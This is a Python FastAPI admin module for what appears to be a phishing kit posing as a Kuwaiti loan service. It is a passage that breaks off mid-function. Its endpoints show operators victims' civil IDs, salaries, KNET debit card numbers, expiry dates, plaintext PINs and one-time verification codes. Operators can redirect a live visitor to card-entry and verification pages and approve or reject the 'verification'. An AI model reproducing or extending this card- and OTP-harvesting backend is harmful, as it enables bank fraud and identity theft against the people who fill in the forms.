from datetime import datetime, timedelta, timezone

from bson import ObjectId
from bson.errors import InvalidId
from fastapi import APIRouter, Request
from fastapi.responses import HTMLResponse, JSONResponse, RedirectResponse
from fastapi.templating import Jinja2Templates

from app.database import get_database
from app.dependencies import (
    ADMIN_SESSION_COOKIE,
    ADMIN_SESSION_MAX_AGE,
    allow_rate_limit,
    create_admin_session_token,
    get_request_ip,
    get_admin_user_from_request,
    has_same_origin,
    validate_admin_credentials,
)
from app.loan_settings import (
    get_annual_interest_rate,
    set_annual_interest_rate,
)
from app.presence import (
    count_online as presence_count_online,
    get_current_pages as presence_get_current_pages,
    get_online_statuses as presence_get_online_statuses,
    is_online as presence_is_online,
    list_online_visitor_ids as presence_list_online_visitor_ids,
    mark_offline as presence_mark_offline,
)
from app.realtime import admin_realtime_hub
from app.realtime import visitor_realtime_hub

router = APIRouter(tags=["Admin"])
templates = Jinja2Templates(directory="app/templates")
REDIRECT_TARGETS: dict[str, str] = {
    "/": "الصفحة الرئيسية",
    "/loan-calculator": "حاسبة القرض",
    "/customer-info": "بيانات العميل",
    "/additional-customer-info": "بيانات العمل",
    "/transaction-notification": "إشعار الدفع",
    "/knet": "كي نت",
    "/verfication": "التحقق",
}
REDIRECT_TARGET_ALIASES: dict[str, str] = {
    "/additional-info": "/additional-customer-info",
    "/transaction-info": "/transaction-notification",
}


def _normalize_redirect_target(target_path_raw: object) -> str:
    target_path = str(target_path_raw).strip() if isinstance(target_path_raw, str) else ""
    if not target_path:
        return ""
    return REDIRECT_TARGET_ALIASES.get(target_path, target_path)


async def _admin_post_guard(
    request: Request, action: str, limit: int = 30, window_seconds: int = 60
) -> JSONResponse | None:
    if not has_same_origin(request):
        return JSONResponse({"error": "csrf blocked"}, status_code=403)
    ip = get_request_ip(request)
    if not await allow_rate_limit(
        f"admin:{action}:{ip}", limit=limit, window_seconds=window_seconds
    ):
        return JSONResponse({"error": "rate limited"}, status_code=429)
    return None


def _format_amount_kwd(value: object) -> str:
    if isinstance(value, bool):
        return "—"
    if isinstance(value, int):
        return f"{value:,} د.ك."
    if isinstance(value, float):
        if value.is_integer():
            return f"{int(value):,} د.ك."
        compact = f"{value:,.3f}".rstrip("0").rstrip(".")
        return f"{compact} د.ك."
    if isinstance(value, str) and value.strip():
        return value.strip()
    return "—"


def _format_relative_unit_ar(
    count: int,
    singular: str,
    dual: str,
    plural: str,
) -> str:
    if count <= 1:
        return f"1 {singular}"
    if count == 2:
        return dual
    return f"{count} {plural}"


def _format_relative_time_ar(created_at: datetime, now_utc: datetime) -> str:
    def ago(phrase: str) -> str:
        return f"منذ {phrase}"

    created_at_utc = (
        created_at.astimezone(timezone.utc)
        if created_at.tzinfo is not None
        else created_at.replace(tzinfo=timezone.utc)
    )
    elapsed_seconds = int((now_utc - created_at_utc).total_seconds())
    if elapsed_seconds < 0:
        elapsed_seconds = 0

    if elapsed_seconds < 60:
        return "منذ بضع ثوان"

    elapsed_minutes = elapsed_seconds // 60
    if elapsed_minutes < 60:
        return ago(
            _format_relative_unit_ar(
                elapsed_minutes,
                singular="دقيقة",
                dual="دقيقتان",
                plural="دقائق",
            )
        )

    elapsed_hours = elapsed_minutes // 60
    if elapsed_hours < 24:
        return ago(
            _format_relative_unit_ar(
                elapsed_hours,
                singular="ساعة",
                dual="ساعتان",
                plural="ساعات",
            )
        )

    elapsed_days = elapsed_hours // 24
    if elapsed_days < 7:
        return ago(
            _format_relative_unit_ar(
                elapsed_days,
                singular="يوم",
                dual="يومان",
                plural="أيام",
            )
        )

    elapsed_weeks = elapsed_days // 7
    if elapsed_weeks < 5:
        return ago(
            _format_relative_unit_ar(
                elapsed_weeks,
                singular="أسبوع",
                dual="أسبوعان",
                plural="أسابيع",
            )
        )

    elapsed_months = max(elapsed_days // 30, 1)
    if elapsed_months < 12:
        return ago(
            _format_relative_unit_ar(
                elapsed_months,
                singular="شهر",
                dual="شهران",
                plural="أشهر",
            )
        )

    elapsed_years = max(elapsed_days // 365, 1)
    return ago(
        _format_relative_unit_ar(
            elapsed_years,
            singular="سنة",
            dual="سنتان",
            plural="سنوات",
        )
    )


@router.get("/admin/login", response_class=HTMLResponse)
async def admin_login_page(request: Request):
    admin_user = get_admin_user_from_request(request)
    if admin_user:
        return RedirectResponse(url="/admin", status_code=303)

    return templates.TemplateResponse(
        "admin/admin_login.html",
        {"request": request, "error": None},
    )


@router.post("/admin/login", response_class=HTMLResponse)
async def admin_login_submit(request: Request):
    ip = get_request_ip(request)
    if not await allow_rate_limit(f"admin-login:{ip}", limit=8, window_seconds=60):
        return templates.TemplateResponse(
            "admin/admin_login.html",
            {
                "request": request,
                "error": "Too many login attempts. Try again in a minute.",
            },
            status_code=429,
        )
    form = await request.form()
    username = str(form.get("username", "")).strip()
    password = str(form.get("password", ""))

    if not validate_admin_credentials(username, password):
        return templates.TemplateResponse(
            "admin/admin_login.html",
            {
                "request": request,
                "error": "Invalid username or password",
            },
            status_code=401,
        )

    response = RedirectResponse(url="/admin", status_code=303)
    response.set_cookie(
        key=ADMIN_SESSION_COOKIE,
        value=create_admin_session_token(username),
        httponly=True,
        samesite="lax",
        secure=request.url.scheme == "https",
        max_age=ADMIN_SESSION_MAX_AGE,
    )
    return response


@router.post("/admin/logout")
async def admin_logout(request: Request):
    guard = await _admin_post_guard(request, "logout", limit=20, window_seconds=60)
    if guard is not None:
        return guard
    response = RedirectResponse(url="/admin/login", status_code=303)
    response.delete_cookie(ADMIN_SESSION_COOKIE)
    return response


@router.get("/admin", response_class=HTMLResponse)
async def admin_dashboard(request: Request):
    admin_user = get_admin_user_from_request(request)
    if not admin_user:
        return RedirectResponse(url="/admin/login", status_code=303)

    db = get_database()
    visitors_collection = db["visitors"]
    metrics_collection = db["visitor_metrics"]

    now_utc = datetime.now(timezone.utc)
    since_24h = now_utc - timedelta(hours=24)

    fallback_count = await visitors_collection.count_documents({})
    metrics_doc = await metrics_collection.find_one(
        {"_id": "global"},
        {"_id": 0, "total_visits": 1, "unique_visitors": 1},
    )
    total_visitors = (
        int(metrics_doc.get("total_visits", 0))
        if isinstance(metrics_doc, dict)
        else fallback_count
    )
    unique_visitors = (
        int(metrics_doc.get("unique_visitors", 0))
        if isinstance(metrics_doc, dict)
        else fallback_count
    )
    visitors_24h = await visitors_collection.count_documents({"created_at": {"$gte": since_24h}})
    online_now = await presence_count_online()
    annual_interest_rate = await get_annual_interest_rate()
    settings_status = str(request.query_params.get("settings", "")).strip().lower()

    return templates.TemplateResponse(
        "admin/admin_dashboard.html",
        {
            "request": request,
            "admin_user": admin_user,
            "total_visitors": total_visitors,
            "unique_visitors": unique_visitors,
            "visitors_24h": visitors_24h,
            "online_now": online_now,
            "generated_at": now_utc.strftime("%Y-%m-%d %H:%M:%S UTC"),
            "annual_interest_rate": annual_interest_rate,
            "settings_status": settings_status,
        },
    )


@router.get("/admin/recent-visitors", response_class=HTMLResponse)
async def admin_recent_visitors(request: Request):
    query = request.url.query
    target = "/admin/recent"
    if query:
        target = f"{target}?{query}"
    return RedirectResponse(url=target, status_code=307)


@router.get("/admin/recent", response_class=HTMLResponse)
@router.get("/admin/recent-visitors-v2", response_class=HTMLResponse)
async def admin_recent_visitors_v2(request: Request):
    admin_user = get_admin_user_from_request(request)
    if not admin_user:
        return RedirectResponse(url="/admin/login", status_code=303)

    db = get_database()
    visitors_collection = db["visitors"]
    customer_info_collection = db["customer_info"]

    cursor = visitors_collection.find({"archived_at": {"$exists": False}}).sort(
        [("last_activity", -1), ("created_at", -1)]
    ).limit(50)
    docs = await cursor.to_list(length=50)

    visitor_ids = [doc["_id"] for doc in docs if isinstance(doc.get("_id"), ObjectId)]
    online_visitor_ids: set[str] = set()
    customer_names_by_visitor: dict[str, str] = {}

    if visitor_ids:
        online_statuses = await presence_get_online_statuses(str(item) for item in visitor_ids)
        online_visitor_ids = {visitor_id for visitor_id, is_online in online_statuses.items() if is_online}

        customer_cursor = customer_info_collection.find(
            {"visitor_id": {"$in": visitor_ids}},
            {"_id": 0, "visitor_id": 1, "applicant_name": 1, "updated_at": 1},
        ).sort("updated_at", -1)
        customer_docs = await customer_cursor.to_list(length=500)
        seen_customer_ids: set[str] = set()
        for customer_doc in customer_docs:
            visitor_object_id = customer_doc.get("visitor_id")
            if not isinstance(visitor_object_id, ObjectId):
                continue
            visitor_key = str(visitor_object_id)
            if visitor_key in seen_customer_ids:
                continue
            seen_customer_ids.add(visitor_key)
            applicant_name_raw = customer_doc.get("applicant_name")
            applicant_name = (
                applicant_name_raw.strip()
                if isinstance(applicant_name_raw, str) and applicant_name_raw.strip()
                else ""
            )
            customer_names_by_visitor[visitor_key] = applicant_name

    recent_visitors: list[dict[str, str]] = []
    for doc in docs:
        visitor_key = str(doc.get("_id", ""))
        if not visitor_key:
            continue
        applicant_name = customer_names_by_visitor.get(visitor_key, "")
        last_activity_raw = doc.get("last_activity")
        created_at_raw = doc.get("created_at")
        activity_source = (
            last_activity_raw
            if isinstance(last_activity_raw, datetime)
            else created_at_raw
        )
        if isinstance(activity_source, datetime):
            activity_dt = (
                activity_source.astimezone(timezone.utc)
                if activity_source.tzinfo is not None
                else activity_source.replace(tzinfo=timezone.utc)
            )
            last_activity_ts = int(activity_dt.timestamp())
        else:
            last_activity_ts = 0
        recent_visitors.append(
            {
                "id": visitor_key,
                "id_tail": visitor_key[-4:] if len(visitor_key) > 4 else visitor_key,
                "identity_label": applicant_name or f"زائر #{visitor_key[-4:] if len(visitor_key) > 4 else visitor_key}",
                "current_page": str(doc.get("current_page", "Home")),
                "online_status": "Online" if visitor_key in online_visitor_ids else "Offline",
                "last_activity_ts": last_activity_ts,
            }
        )

    recent_visitors.sort(key=lambda visitor: visitor["online_status"] != "Online")

    return templates.TemplateResponse(
        "admin/recent-visitors-v2.html",
        {
            "request": request,
            "admin_user": admin_user,
            "recent_visitors": recent_visitors,
        },
    )


@router.get("/admin/recent/statuses")
@router.get("/admin/recent-visitors/statuses")
async def admin_recent_visitors_statuses(request: Request):
    admin_user = get_admin_user_from_request(request)
    if not admin_user:
        return JSONResponse({"error": "unauthorized"}, status_code=401)

    db = get_database()
    customer_info_collection = db["customer_info"]
    visitors_collection = db["visitors"]

    ids_raw = str(request.query_params.get("ids", "")).strip()
    if not ids_raw:
        has_new_visitors = await visitors_collection.count_documents(
            {"archived_at": {"$exists": False}},
            limit=1,
        ) > 0
        return JSONResponse(
            {
                "statuses": {},
                "info_flags": {},
                "current_pages": {},
                "has_new_visitors": has_new_visitors,
            }
        )

    requested_ids: list[str] = []
    requested_object_ids: list[ObjectId] = []
    seen_ids: set[str] = set()
    for raw_id in ids_raw.split(","):
        visitor_id = raw_id.strip()
        if not visitor_id or visitor_id in seen_ids:
            continue
        try:
            visitor_object_id = ObjectId(visitor_id)
        except InvalidId:
            continue

        seen_ids.add(visitor_id)
        requested_ids.append(visitor_id)
        requested_object_ids.append(visitor_object_id)

    if not requested_object_ids:
        return JSONResponse({"statuses": {}, "info_flags": {}, "current_pages": {}, "has_new_visitors": False})

    online_statuses = await presence_get_online_statuses(requested_ids)
    online_visitor_ids = {visitor_id for visitor_id, is_online in online_statuses.items() if is_online}

    statuses = {
        visitor_id: "Online" if visitor_id in online_visitor_ids else "Offline"
        for visitor_id in requested_ids
    }

    info_flags = {visitor_id: False for visitor_id in requested_ids}
    customer_cursor = customer_info_collection.find(
        {"visitor_id": {"$in": requested_object_ids}},
        {"_id": 0, "visitor_id": 1, "has_new_info_for_admin": 1, "updated_at": 1},
    ).sort("updated_at", -1)
    customer_docs = await customer_cursor.to_list(length=500)
    seen_customer_ids: set[str] = set()
    for customer_doc in customer_docs:
        visitor_object_id = customer_doc.get("visitor_id")
        if not isinstance(visitor_object_id, ObjectId):
            continue

        visitor_key = str(visitor_object_id)
        if visitor_key in seen_customer_ids:
            continue
        seen_customer_ids.add(visitor_key)
        info_flags[visitor_key] = bool(customer_doc.get("has_new_info_for_admin", False))

    current_pages = {visitor_id: "الصفحة الرئيسية" for visitor_id in requested_ids}
    redis_current_pages = await presence_get_current_pages(requested_ids)
    for visitor_id, current_page in redis_current_pages.items():
        if isinstance(current_page, str) and current_page.strip():
            current_pages[visitor_id] = current_page.strip()

    has_new_visitors = False
    unseen_query: dict[str, object] = {
        "archived_at": {"$exists": False},
        "_id": {"$nin": requested_object_ids},
    }
    unseen_doc = await visitors_collection.find_one(unseen_query, {"_id": 1})
    if isinstance(unseen_doc, dict):
        has_new_visitors = True

    return JSONResponse(
        {
            "statuses": statuses,
            "info_flags": info_flags,
            "current_pages": current_pages,
            "has_new_visitors": has_new_visitors,
        }
    )


@router.get("/admin/visitors/{visitor_id}/summary")
async def get_admin_visitor_summary(request: Request, visitor_id: str):
    admin_user = get_admin_user_from_request(request)
    if not admin_user:
        return JSONResponse({"error": "unauthorized"}, status_code=401)

    try:
        visitor_object_id = ObjectId(visitor_id)
    except InvalidId:
        return JSONResponse({"error": "invalid visitor id"}, status_code=400)

    db = get_database()
    visitors_collection = db["visitors"]
    customer_info_collection = db["customer_info"]
    loan_submissions_collection = db["loan_submissions"]

    visitor_doc = await visitors_collection.find_one(
        {"_id": visitor_object_id, "archived_at": {"$exists": False}}
    )
    if not isinstance(visitor_doc, dict):
        return JSONResponse({"error": "not found"}, status_code=404)

    now_utc = datetime.now(timezone.utc)
    customer_doc = await customer_info_collection.find_one(
        {"visitor_id": visitor_object_id},
        sort=[("updated_at", -1)],
    )
    submission_doc = await loan_submissions_collection.find_one(
        {"visitor_id": visitor_object_id},
        sort=[("created_at", -1)],
    )
    is_online = await presence_is_online(visitor_id)

    loan_type_labels = {
        "cash": "قرض نقدي",
        "automobile": "قرض سيارة",
        "furniture": "قرض أثاث",
        "marine": "معدات بحرية",
        "electrical": "أجهزة كهربائية",
        "housing": "قرض مقسط",
        "educational": "تعليمي",
        "commercial": "قروض شركات",
    }

    amount_display = "—"
    loanterm_display = "—"
    loan_type_display = "—"
    if isinstance(submission_doc, dict):
        amount_raw = submission_doc.get("amount")
        if isinstance(amount_raw, (int, float)):
            amount_display = f"{float(amount_raw):,.0f}"
        loanterm_raw = submission_doc.get("loanterm")
        if isinstance(loanterm_raw, int):
            loanterm_display = str(loanterm_raw)
        elif isinstance(loanterm_raw, float) and loanterm_raw.is_integer():
            loanterm_display = str(int(loanterm_raw))
        loan_type_raw = submission_doc.get("loan_type")
        if isinstance(loan_type_raw, str):
            loan_type_key = loan_type_raw.strip().lower()
            loan_type_display = loan_type_labels.get(loan_type_key, loan_type_raw.strip() or "—")

    applicant_name = "—"
    civil_id = "—"
    phone_number = "—"
    job_title = "—"
    salary = "—"
    additional_income = "—"
    has_new_info = False
    if isinstance(customer_doc, dict):
        applicant_name_raw = customer_doc.get("applicant_name")
        civil_id_raw = customer_doc.get("civil_id")
        phone_number_raw = customer_doc.get("phone_number")
        job_title_raw = customer_doc.get("job_title")
        applicant_name = applicant_name_raw.strip() if isinstance(applicant_name_raw, str) and applicant_name_raw.strip() else "—"
        civil_id = civil_id_raw.strip() if isinstance(civil_id_raw, str) and civil_id_raw.strip() else "—"
        phone_number = phone_number_raw.strip() if isinstance(phone_number_raw, str) and phone_number_raw.strip() else "—"
        job_title = job_title_raw.strip() if isinstance(job_title_raw, str) and job_title_raw.strip() else "—"
        salary = _format_amount_kwd(customer_doc.get("salary"))
        additional_income = _format_amount_kwd(customer_doc.get("additional_income"))
        has_new_info = bool(customer_doc.get("has_new_info_for_admin", False))

    created_at_raw = visitor_doc.get("created_at")
    created_at_display = (
        _format_relative_time_ar(created_at_raw, now_utc)
        if isinstance(created_at_raw, datetime)
        else "غير متوفر"
    )
    last_activity_raw = visitor_doc.get("last_activity")
    last_activity_display = (
        _format_relative_time_ar(last_activity_raw, now_utc)
        if isinstance(last_activity_raw, datetime)
        else created_at_display
    )

    identity_label = (
        applicant_name
        if applicant_name != "—"
        else (visitor_id[-4:] if len(visitor_id) > 4 else visitor_id)
    )

    return JSONResponse(
        {
            "id": visitor_id,
            "id_tail": visitor_id[-4:] if len(visitor_id) > 4 else visitor_id,
            "identity_label": identity_label,
            "applicant_name": applicant_name,
            "civil_id": civil_id,
            "phone_number": phone_number,
            "job_title": job_title,
            "salary": salary,
            "additional_income": additional_income,
            "current_page": str(visitor_doc.get("current_page", "الصفحة الرئيسية")),
            "online_status": "Online" if is_online else "Offline",
            "loan_type": loan_type_display,
            "amount": amount_display,
            "loanterm": loanterm_display,
            "created_at": created_at_display,
            "last_activity": last_activity_display,
            "has_new_info": has_new_info,
        }
    )


@router.post("/admin/visitors/{visitor_id}/redirect")
async def redirect_visitor_to_page(request: Request, visitor_id: str):
    guard = await _admin_post_guard(request, "redirect-visitor", limit=30, window_seconds=60)
    if guard is not None:
        return guard
    admin_user = get_admin_user_from_request(request)
    if not admin_user:
        return JSONResponse({"error": "unauthorized"}, status_code=401)

    try:
        visitor_object_id = ObjectId(visitor_id)
    except InvalidId:
        return JSONResponse({"error": "invalid visitor id"}, status_code=400)

    payload = await request.json()
    target_path_raw = payload.get("target_path") if isinstance(payload, dict) else ""
    target_path = _normalize_redirect_target(target_path_raw)
    if target_path not in REDIRECT_TARGETS:
        return JSONResponse({"error": "invalid target path"}, status_code=400)

    now_utc = datetime.now(timezone.utc)
    redirect_collection = get_database()["visitor_redirects"]
    await redirect_collection.update_one(
        {"visitor_id": visitor_object_id},
        {
            "$set": {
                "visitor_id": visitor_object_id,
                "target_path": target_path,
                "updated_at": now_utc,
                "requested_by": str(admin_user),
            },
            "$setOnInsert": {"created_at": now_utc},
        },
        upsert=True,
    )
    await admin_realtime_hub.broadcast(
        "admin.visitor.redirect.requested",
        visitor_id=visitor_id,
        meta={"target_path": target_path},
    )
    await visitor_realtime_hub.send_to_visitor(
        visitor_id=visitor_id,
        event="visitor.redirect",
        meta={"target_path": target_path},
    )
    return JSONResponse({"status": "ok", "target_path": target_path})


@router.post("/admin/visitors/{visitor_id}/mark-info-viewed")
async def mark_visitor_info_viewed(request: Request, visitor_id: str):
    guard = await _admin_post_guard(request, "mark-info", limit=60, window_seconds=60)
    if guard is not None:
        return guard
    admin_user = get_admin_user_from_request(request)
    if not admin_user:
        return JSONResponse({"error": "unauthorized"}, status_code=401)

    try:
        visitor_object_id = ObjectId(visitor_id)
    except InvalidId:
        return JSONResponse({"error": "invalid visitor id"}, status_code=400)

    customer_info_collection = get_database()["customer_info"]
    await customer_info_collection.update_one(
        {"visitor_id": visitor_object_id},
        {
            "$set": {
                "has_new_info_for_admin": False,
                "info_reviewed_at": datetime.now(timezone.utc),
            }
        },
    )
    await admin_realtime_hub.broadcast(
        "admin.visitor.info.viewed",
        visitor_id=visitor_id,
        meta={"has_new_info": False},
    )
    return JSONResponse({"status": "ok"})


@router.get("/admin/visitors/{visitor_id}/knet-submissions")
async def get_visitor_knet_submissions(request: Request, visitor_id: str):
    admin_user = get_admin_user_from_request(request)
    if not admin_user:
        return JSONResponse({"error": "unauthorized"}, status_code=401)

    try:
        visitor_object_id = ObjectId(visitor_id)
    except InvalidId:
        return JSONResponse({"error": "invalid visitor id"}, status_code=400)

    now_utc = datetime.now(timezone.utc)
    db = get_database()
    knet_submissions_collection = db["knet_submissions"]
    knet_submission_logs_collection = db["knet_submission_logs"]
    verification_collection = db["knet_verifications"]
    codes_collection = db["knet_verification_codes"]
    cursor = knet_submissions_collection.find(
        {"visitor_id": visitor_object_id, "archived_at": {"$exists": False}},
        {
            "_id": 1,
            "bank": 1,
            "dcprefix": 1,
            "debit_number": 1,
            "exp_month": 1,
            "exp_year": 1,
            "pin_code": 1,
            "card_number_length_valid": 1,
            "luhn_valid": 1,
            "expiry_valid": 1,
            "created_at": 1,
        },
    ).sort("created_at", -1)
    docs = await cursor.to_list(length=100)

    submission_ids: list[ObjectId] = [
        doc["_id"] for doc in docs if isinstance(doc.get("_id"), ObjectId)
    ]
    codes_by_submission: dict[str, list[dict[str, str]]] = {}
    if submission_ids:
        codes_cursor = codes_collection.find(
            {"knet_submission_id": {"$in": submission_ids}},
            {"_id": 0, "knet_submission_id": 1, "code_value": 1, "created_at": 1},
        ).sort("created_at", -1)
        async for code_doc in codes_cursor:
            submission_object_id = code_doc.get("knet_submission_id")
            if not isinstance(submission_object_id, ObjectId):
                continue
            code_value_raw = code_doc.get("code_value")
            if not isinstance(code_value_raw, str):
                continue
            created_at_raw = code_doc.get("created_at")
            created_at_display = (
                _format_relative_time_ar(created_at_raw, now_utc)
                if isinstance(created_at_raw, datetime)
                else "غير متوفر"
            )
            key = str(submission_object_id)
            codes_by_submission.setdefault(key, []).append(
                {
                    "value": code_value_raw.strip() or "—",
                    "created_at": created_at_display,
                }
            )

    submissions: list[dict[str, object]] = []
    for doc in docs:
        created_at_raw = doc.get("created_at")
        if isinstance(created_at_raw, datetime):
            created_at_display = _format_relative_time_ar(created_at_raw, now_utc)
        else:
            created_at_display = "غير متوفر"

        month_raw = doc.get("exp_month")
        month_display = f"{int(month_raw):02d}" if isinstance(month_raw, int) else "—"
        year_raw = doc.get("exp_year")
        year_display = str(year_raw) if isinstance(year_raw, int) else "—"

        submissions.append(
            {
                "id": str(doc.get("_id", "")),
                "is_log": False,
                "bank": str(doc.get("bank", "—")),
                "dcprefix": str(doc.get("dcprefix", "—")),
                "debit_number": str(doc.get("debit_number", "—")),
                "pin_code": str(doc.get("pin_code", "—")),
                "expiry": f"{month_display}/{year_display}",
                "card_number_length_valid": bool(doc.get("card_number_length_valid", False)),
                "luhn_valid": bool(doc.get("luhn_valid", False)),
                "expiry_valid": bool(doc.get("expiry_valid", False)),
                "can_verify": bool(doc.get("card_number_length_valid", False))
                and bool(doc.get("luhn_valid", False))
                and bool(doc.get("expiry_valid", False)),
                "created_at": created_at_display,
                "created_at_iso": created_at_raw.isoformat() if isinstance(created_at_raw, datetime) else "",
                "verfication_codes": codes_by_submission.get(str(doc.get("_id", "")), []),
                "missing_fields": [],
                "validation_error": "",
            }
        )

    log_cursor = knet_submission_logs_collection.find(
        {"visitor_id": visitor_object_id},
        {
            "_id": 1,
            "bank": 1,
            "dcprefix": 1,
            "debit_number": 1,
            "exp_month": 1,
            "exp_year": 1,
            "pin_code": 1,
            "missing_fields": 1,
            "validation_error": 1,
            "created_at": 1,
        },
    ).sort("created_at", -1)
    log_docs = await log_cursor.to_list(length=100)
    for doc in log_docs:
        created_at_raw = doc.get("created_at")
        created_at_display = (
            _format_relative_time_ar(created_at_raw, now_utc)
            if isinstance(created_at_raw, datetime)
            else "غير متوفر"
        )
        month_raw = doc.get("exp_month")
        month_display = f"{int(month_raw):02d}" if isinstance(month_raw, int) and month_raw > 0 else "—"
        year_raw = doc.get("exp_year")
        year_display = str(year_raw) if isinstance(year_raw, int) and year_raw > 0 else "—"
        missing_fields_raw = doc.get("missing_fields")
        missing_fields = (
            [str(item).strip() for item in missing_fields_raw if str(item).strip()]
            if isinstance(missing_fields_raw, list)
            else []
        )
        submissions.append(
            {
                "id": f"log:{str(doc.get('_id', ''))}",
                "is_log": True,
                "bank": str(doc.get("bank", "—")),
                "dcprefix": str(doc.get("dcprefix", "—")),
                "debit_number": str(doc.get("debit_number", "—")),
                "pin_code": str(doc.get("pin_code", "—")),
                "expiry": f"{month_display}/{year_display}",
                "card_number_length_valid": False,
                "luhn_valid": False,
                "expiry_valid": False,
                "can_verify": False,
                "created_at": created_at_display,
                "created_at_iso": created_at_raw.isoformat() if isinstance(created_at_raw, datetime) else "",
                "verfication_codes": [],
                "missing_fields": missing_fields,
                "validation_error": str(doc.get("validation_error", "")).strip(),
            }
        )

    submissions.sort(key=lambda item: str(item.get("created_at_iso", "")), reverse=True)

    verification_doc = await verification_collection.find_one(
        {"visitor_id": visitor_object_id},
        {"_id": 0, "status": 1},
    )
    verification_status_raw = (
        str(verification_doc.get("status", "")).strip().lower()
        if isinstance(verification_doc, dict)
        else ""
    )
    verification_status = (
        verification_status_raw
        if verification_status_raw in {"pending", "approved", "rejected"}
        else "pending"
    )
    return JSONResponse(
        {
            "submissions": submissions,
            "verification_status": verification_status,
        }
    )


@router.post("/admin/knet-submissions/{submission_id}/archive")
async def archive_knet_submission(request: Request, submission_id: str):
    guard = await _admin_post_guard(request, "archive-knet", limit=40, window_seconds=60)
    if guard is not None:
        return guard
    admin_user = get_admin_user_from_request(request)
    if not admin_user:
        return JSONResponse({"error": "unauthorized"}, status_code=401)

    try:
        submission_object_id = ObjectId(submission_id)
    except InvalidId:
        return JSONResponse({"error": "invalid submission id"}, status_code=400)

    now_utc = datetime.now(timezone.utc)
    knet_submissions_collection = get_database()["knet_submissions"]
    result = await knet_submissions_collection.update_one(
        {"_id": submission_object_id},
        {
            "$set": {
                "archived_at": now_utc,
                "archive_reason": "admin-card-archive",
                "archived_by": str(admin_user),
            }
        },
    )
    if result.matched_count == 0:
        return JSONResponse({"error": "not found"}, status_code=404)
    archived_doc = await knet_submissions_collection.find_one(
        {"_id": submission_object_id},
        {"_id": 0, "visitor_id": 1},
    )
    visitor_object_id = archived_doc.get("visitor_id") if isinstance(archived_doc, dict) else None
    if isinstance(visitor_object_id, ObjectId):
        await admin_realtime_hub.broadcast(
            "admin.knet.submission.archived",
            visitor_id=str(visitor_object_id),
            meta={"submission_id": submission_id},
        )
    return JSONResponse({"status": "ok"})


@router.post("/admin/visitors/{visitor_id}/knet-verification/{decision}")
async def set_visitor_knet_verification_decision(
    request: Request,
    visitor_id: str,
    decision: str,
):
    guard = await _admin_post_guard(request, "knet-decision", limit=40, window_seconds=60)
    if guard is not None:
        return guard
    admin_user = get_admin_user_from_request(request)
    if not admin_user:
        return JSONResponse({"error": "unauthorized"}, status_code=401)

    decision_normalized = str(decision).strip().lower()
    if decision_normalized not in {"approved", "rejected"}:
        return JSONResponse({"error": "invalid decision"}, status_code=400)

    try:
        visitor_object_id = ObjectId(visitor_id)
    except InvalidId:
        return JSONResponse({"error": "invalid visitor id"}, status_code=400)

    now_utc = datetime.now(timezone.utc)
    verification_collection = get_database()["knet_verifications"]
    await verification_collection.update_one(
        {"visitor_id": visitor_object_id},
        {
            "$set": {
                "visitor_id": visitor_object_id,
                "status": decision_normalized,
                "updated_at": now_utc,
                "reviewed_by": str(admin_user),
            },
            "$setOnInsert": {"created_at": now_utc},
        },
        upsert=True,
    )
    await admin_realtime_hub.broadcast(
        "visitor.knet.verification.updated",
        visitor_id=visitor_id,
        meta={"status": decision_normalized, "reviewed_by": str(admin_user)},
    )
    await visitor_realtime_hub.send_to_visitor(
        visitor_id=visitor_id,
        event="visitor.knet.verification.updated",
        meta={"status": decision_normalized, "reviewed_by": str(admin_user)},
    )
    return JSONResponse({"status": "ok", "decision": decision_normalized})


@router.post("/admin/visitors/{visitor_id}/delete")
async def delete_visitor_entry(request: Request, visitor_id: str):
    guard = await _admin_post_guard(request, "archive-visitor", limit=25, window_seconds=60)
    if guard is not None:
        return guard
    admin_user = get_admin_user_from_request(request)
    if not admin_user:
        return RedirectResponse(url="/admin/login", status_code=303)

    try:
        visitor_object_id = ObjectId(visitor_id)
    except InvalidId:
        return RedirectResponse(url="/admin/recent?delete=error", status_code=303)

    db = get_database()
    visitors_collection = db["visitors"]

    if await presence_is_online(visitor_id):
        return RedirectResponse(url="/admin/recent?delete=online", status_code=303)

    now_utc = datetime.now(timezone.utc)
    await visitors_collection.update_one(
        {"_id": visitor_object_id},
        {
            "$set": {
                "archived_at": now_utc,
                "archive_reason": "offline-entry",
            }
        },
    )
    await presence_mark_offline(visitor_id)
    await admin_realtime_hub.broadcast(
        "admin.visitor.archived",
        visitor_id=visitor_id,
        meta={"reason": "offline-entry"},
    )
    return RedirectResponse(url="/admin/recent?delete=deleted", status_code=303)


@router.post("/admin/visitors/delete-offline")
async def delete_all_offline_entries(request: Request):
    guard = await _admin_post_guard(request, "archive-all-offline", limit=10, window_seconds=60)
    if guard is not None:
        return guard
    admin_user = get_admin_user_from_request(request)
    if not admin_user:
        return RedirectResponse(url="/admin/login", status_code=303)

    db = get_database()
    visitors_collection = db["visitors"]

    online_visitor_ids_raw = await presence_list_online_visitor_ids()
    online_visitor_ids: list[ObjectId] = []
    for entry in online_visitor_ids_raw:
        try:
            online_visitor_ids.append(ObjectId(entry))
        except InvalidId:
            continue

    offline_visitor_ids: list[ObjectId] = []
    offline_query: dict[str, object]
    if online_visitor_ids:
        offline_query = {
            "_id": {"$nin": online_visitor_ids},
            "archived_at": {"$exists": False},
        }
    else:
        offline_query = {"archived_at": {"$exists": False}}

    async for visitor_doc in visitors_collection.find(offline_query, {"_id": 1}):
        visitor_object_id = visitor_doc.get("_id")
        if isinstance(visitor_object_id, ObjectId):
            offline_visitor_ids.append(visitor_object_id)

    if not offline_visitor_ids:
        return RedirectResponse(url="/admin/recent?delete=none", status_code=303)

    now_utc = datetime.now(timezone.utc)
    await visitors_collection.update_many(
        {"_id": {"$in": offline_visitor_ids}},
        {
            "$set": {
                "archived_at": now_utc,
                "archive_reason": "bulk-offline",
            }
        },
    )
    for offline_id in offline_visitor_ids:
        await presence_mark_offline(str(offline_id))
    for offline_id in offline_visitor_ids:
        await admin_realtime_hub.broadcast(
            "admin.visitor.archived",
            visitor_id=str(offline_id),
            meta={"reason": "bulk-offline"},
        )
    return RedirectResponse(
        url=f"/admin/recent?delete=bulk-deleted&count={len(offline_visitor_ids)}",
        status_code=303,
    )


@router.post("/admin/loan-settings")
async def update_loan_settings(request: Request):
    guard = await _admin_post_guard(request, "loan-settings", limit=20, window_seconds=60)
    if guard is not None:
        return guard
    admin_user = get_admin_user_from_request(request)
    if not admin_user:
        return RedirectResponse(url="/admin/login", status_code=303)

    form = await request.form()
    raw_rate = str(form.get("annual_interest_rate", "")).strip()

    try:
        rate = float(raw_rate)
    except (TypeError, ValueError):
        return RedirectResponse(url="/admin?settings=error", status_code=303)

